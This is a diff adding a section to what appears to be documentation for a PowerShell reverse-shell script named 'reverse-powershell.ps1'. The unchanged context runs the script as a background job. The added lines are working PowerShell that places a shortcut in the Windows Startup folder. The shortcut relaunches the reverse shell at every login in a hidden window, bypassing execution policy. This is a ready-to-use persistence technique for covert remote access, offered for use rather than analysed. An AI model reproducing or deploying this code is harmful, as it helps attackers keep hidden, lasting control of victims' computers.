@@ -29,3 +29,15 @@ To allow the script to run, you may need to set the execution policy to `RemoteS
 ```powershell
    Start-Job -ScriptBlock { C:\Users\adm\Downloads\reverse-powershell.ps1 }
 ```
+
+# Create a shortcut to the reverse shell script in the Startup folder
+$startupFolder = [System.Environment]::GetFolderPath('Startup')
+$scriptPath = "C:\path\to\reverse-powershell.ps1"
+$shortcutPath = "$startupFolder\reverse-powershell.lnk"
+
+# Create a WScript Shell object to create the shortcut
+$wshShell = New-Object -ComObject WScript.Shell
+$shortcut = $wshShell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = "powershell.exe"
+$shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath"
+$shortcut.Save()
